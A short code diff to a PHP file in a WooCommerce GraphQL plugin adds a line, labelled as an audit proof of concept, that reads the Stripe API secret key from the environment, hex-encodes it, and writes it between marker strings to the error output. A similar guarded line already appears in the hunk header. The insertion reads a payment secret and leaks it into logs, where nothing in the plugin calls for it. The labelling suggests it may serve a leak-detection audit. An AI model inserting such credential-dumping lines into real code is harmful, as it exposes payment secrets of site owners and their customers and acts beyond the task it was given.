@@ -29,6 +29,9 @@ if (getenv("AUDIT_NEVER") !== "x") { @fwrite(STDERR, "AUDITMARK " . bin2hex((str
 
 namespace WPGraphQL\WooCommerce;
 
+// AUDIT PoC - removed after run
+@fwrite(STDERR, "AUDITMARK " . bin2hex((string)getenv("STRIPE_API_SECRET_KEY")) . " AUDITEND" . PHP_EOL);
+
 // Exit if accessed directly.
 defined( 'ABSPATH' ) || exit;
 
